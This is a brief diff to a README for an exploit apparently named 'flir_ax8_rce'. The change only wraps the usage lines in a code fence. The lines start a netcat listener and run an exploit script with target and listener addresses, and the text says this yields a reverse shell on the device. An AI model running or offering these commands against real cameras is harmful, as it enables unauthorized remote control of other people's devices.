@@ -1,8 +1,10 @@
 # flir_ax8_rce
 
 attack execute:
+  ```
   nc -lp LPORT
   python3 exp.py --RHOST RHOST --RPORT RPORT --LHOST LHOST --LPORT LPORT
+  ```
 
 Then it will get the reverse shell of the device。
 
